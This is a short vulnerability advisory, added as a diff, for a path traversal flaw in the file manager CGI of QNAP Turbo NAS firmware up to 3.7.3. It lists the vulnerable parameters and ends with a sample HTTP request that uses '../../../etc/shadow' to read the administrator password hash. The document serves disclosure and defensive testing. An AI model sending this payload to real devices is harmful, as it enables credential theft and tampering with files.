@@ -1,0 +1,37 @@
+# Exploit Title: QNAP Turbo NAS Multiple Path Injection
+# Date: 2012-09-04
+# Exploit Author: Andrea Fabrizi
+# Vendor Homepage: http://www.qnap.com/
+# Version: <= 3.7.3 build 20120801
+# Tested on: QNAP TS-1279U-RP
+
+This vulnerability has been discovered on QNAP TS-1279U-RP, but probably
+other products that use the same firmware may be affected.
+
+The CGI "/cgi-bin/filemanager/utilRequest.cgi" is prone to a path
+injection, which makes it possible,
+for authenticated users, to access, delete o modify any file, included
+system files, configuration files and
+files owned by other users.
+
+Due to the single user configuration of the embedded linux system, it
+is possible to access
+any system file without restrictions (included /etc/shadow, that
+contains the hash of the administrator password).
+
+Vulnerable parameters are (the list is not exhaustive):
+/cgi-bin/filemanager/utilRequest.cgi [source_file]
+/cgi-bin/filemanager/utilRequest.cgi?func=delete [file_name]
+/cgi-bin/filemanager/utilRequest.cgi?func=copy [dest_path]
+/cgi-bin/filemanager/utilRequest.cgi?func=move [dest_path]
+/cgi-bin/filemanager/utilRequest.cgi?func=get_acl_properties [name]
+
+Sample HTTP request:
+###########################################################
+POST /cgi-bin/filemanager/utilRequest.cgi/test.txt HTTP/1.1
+Host: 192.168.0.10
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 123
+
+isfolder=0&func=download&sid=12345abc&source_total=1&source_path=/myFiles&source_file=../../../etc/shadow
+###########################################################
